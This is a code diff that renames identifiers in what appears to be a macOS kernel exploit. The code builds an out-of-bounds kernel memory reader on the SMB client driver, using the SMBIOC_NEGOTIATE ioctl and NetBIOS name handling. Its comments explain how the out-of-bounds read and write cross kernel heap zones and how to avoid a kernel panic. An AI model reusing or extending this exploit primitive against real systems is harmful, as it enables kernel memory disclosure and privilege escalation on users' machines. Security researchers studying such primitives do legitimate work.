@@ -71,7 +71,7 @@
 /// name. Of this 172 bytes, the first 76 bytes came from memory allocated for `iod->iod_saddr`
 /// and the reset 96 bytes came from the succeeding zone element of `iod->iod_saddr` in kext.96
 /// zone. NOTE: since OOB write occurs in default.64 zone, care must be taken to make sure the
-/// OOB write will not eventually trigger kernel panic. See oob_reader_ovf.c for using this
+/// OOB write will not eventually trigger kernel panic. See xe_oob_reader_ovf.c for using this
 /// method to achieve OOB read in zones on `KHEAP_KEXT` with size greater than 32
 ///
 /// Example 2: OOB read from `kext.32` zone
@@ -81,18 +81,18 @@
 ///
 
 
-struct oob_reader_base {
+struct xe_oob_reader_base {
     int fd_snb_name_client;
     int fd_kmem_reader;
     _Atomic uint32_t keygen;
 };
 
 static dispatch_once_t g_kmem_oob_reader_token;
-static struct oob_reader_base* g_kmem_oob_reader;
+static struct xe_oob_reader_base* g_kmem_oob_reader;
 
 
-struct oob_reader_base* oob_reader_base_create(const struct sockaddr_in* smb_addr) {
-    struct oob_reader_base* reader = malloc(sizeof(struct oob_reader_base));
+struct xe_oob_reader_base* xe_oob_reader_base_create(const struct sockaddr_in* smb_addr) {
+    struct xe_oob_reader_base* reader = malloc(sizeof(struct xe_oob_reader_base));
     
     /// SMB device used to execute `SMBIOC_NEGOTIATE` ioctl request for OOB read
     reader->fd_kmem_reader = smb_client_open_dev();
@@ -111,10 +111,10 @@ struct oob_reader_base* oob_reader_base_create(const struct sockaddr_in* smb_add
     return reader;
 }
 
-void oob_reader_base_read(const struct oob_reader_base_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size) {
+void xe_oob_reader_base_read(const struct xe_oob_reader_base_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size) {
     
     dispatch_once(&g_kmem_oob_reader_token, ^{
-        g_kmem_oob_reader = oob_reader_base_create(&args->smb_addr);
+        g_kmem_oob_reader = xe_oob_reader_base_create(&args->smb_addr);
     });
     
     /// If the segment data length is 255, an infinite for loop will be created in `nb_put_name`
